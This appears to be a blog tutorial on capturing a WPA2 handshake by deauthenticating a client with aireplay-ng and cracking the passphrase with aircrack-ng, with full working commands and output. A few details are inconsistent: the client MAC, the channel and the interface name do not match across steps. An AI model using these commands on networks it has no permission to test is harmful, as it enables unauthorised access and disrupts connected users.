---
description: >-
  Cracking Hashes
title:  Cracking Hashes      # Add title here
date: 2023-09-27 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Cracking Attacks]                     # Change Templates to Writeup
tags: [wireless, cracking hashes]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Methodology

First, we'll need to capture a handshake. 
Next, we will make a guess at the passphrase and send that guess into the hash function. 
We will then compare the output from the hash function to the handshake.

### Capturing the Handshake

We will identify the channel of the target AP and gather its BSSID to limit our capture with airodump-ng.
```bash
sudo airodump-ng wlan0
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 XX:XX:XX:XX:XX:XX  -67        4        0    0  11  720   WPA2 CCMP   PSK  PUMA5_GOL   
 XX:XX:XX:XX:XX:XX  -69        4        0    0   8  130   WPA2 CCMP   PSK  Total play may
 XX:XX:XX:XX:XX:XX  -71        3        0    0   2  130   OPN              ClubTotalplay_WiFi_2.4G
 XX:XX:XX:XX:XX:XX  -49       28        0    0  11  195   WPA2 CCMP   PSK  TOTALPLAY_220C3C       
 XX:XX:XX:XX:XX:XX  -61       12        0    0  11  130   WPA2 CCMP   PSK  INFINITUM37FA 
 XX:XX:XX:XX:XX:XX  -67       13        0    0  11  130   WPA2 CCMP   PSK  IZZI-F0AC   
 XX:XX:XX:XX:XX:XX  -38       24        3    0  11  195   WPA2 CCMP   PSK  IZZI-F0AC   
 XX:XX:XX:XX:XX:XX  -68        3        0    0   6  130   OPN              MXConectado-E 
 XX:XX:XX:XX:XX:XX  -66        4        0    0   6  540   WPA2 CCMP   PSK  IZZI-D49A   
 XX:XX:XX:XX:XX:XX  -61       13        1    0   8  130   WPA2 CCMP   PSK  INFINITUM1500 
 7C:13:1D:B2:3D:A4  -29       42       19    0   5  130   WPA2 CCMP   PSK  Not_Of_Your_Buzzinez <----
BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX  -67    0 - 1e     0        1
 XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX  -69    1e- 1e     0        3
 XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX  -69    0 - 1e     0        2
 7C:13:1D:B2:3D:A4  1E:F4:C6:7B:66:C1  -32    0 - 1e     0        1 <----
 XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX  -71    0 - 1e   502        6
 XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX   -1    1e- 0      0       72                   
```
Our target is the 'Not_Of_Your_Buzzinez' AP, which operates on channel 5. Its BSSID is 7C:13:1D:B2:3D:A4 and it has one client with a MAC address of 00:18:4D:1D:A8:1F. The AUTH column shows the AP has an authentication type of PSK. This is a good sign. aircrack-ng does not work when the authentication is Enterprise (MGT), as it requires a different set of tools. Opportunistic Wireless Encryption cannot be cracked yet.

Then we proceed to capture the packet as follows:
```bash
sudo airodump-ng -c 5 -w wpa --essid 'Not_Of_Your_Buzzinez' --bssid 7C:13:1D:B2:3D:A4 wlan0
```

With the airodump-ng running we then proceed to deauthenticate the user from the AP with aireplay-ng. We'll use the -0 1 option to deauthenticate once, and -a to target our BSSID. We'll use -c to identify the associated client, and finally specify wlan0mon for our listening interface.
```bash
sudo aireplay-ng -0 1 -a 7C:13:1D:B2:3D:A4 -c 1E:F4:C6:7B:66:C1 wlan0
13:30:30  Waiting for beacon frame (BSSID: 7C:13:1D:B2:3D:A4) on channel 1
13:30:30  Sending 64 directed DeAuth (code 7). STMAC: [1E:F4:C6:7B:66:C1] [ 0| 0 ACKs]

```
Aireplay-ng checks that the BSSID exists before sending the deauthentication packets. Once the client reconnects with the target AP, airodump-ng will be able to capture a handshake.
```bash
CH  5 ][ Elapsed: 52 s ][ 2020-02-29 13:31 ][ WPA handshake: 1E:F4:C6:7B:66:C1
```

### Cracking the Hash

Now that we have captured a handshake, cracking it is relatively easy. We run aircrack-ng against our recently created capture file, wpa-01.cap. We'll use a list of commonly used passwords, also known as a wordlist, located at /usr/share/john/password.lst. We'll use -w to specify the path to our wordlist. Next, we'll use -e to indicate which ESSID to target, and then -b to specify the BSSID.

```bash
aircrack-ng -w /usr/share/john/password.lst -e 'Not_Of_Your_Buzzinez' -b 7C:13:1D:B2:3D:A4 wpa-01.cap
                               Aircrack-ng 1.7 

      [00:00:00] 2/5 keys tested (214.45 k/s) 

      Time left: 0 seconds                                      40.00%

                      KEY FOUND! [ Th1s1s0bvi0uslyN0tTh3P4ssw0rd ]


      Master Key     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 
                       XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 

      Transient Key  : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 
                       XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 
                       XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 
                       XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX 

      EAPOL HMAC     : XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX
```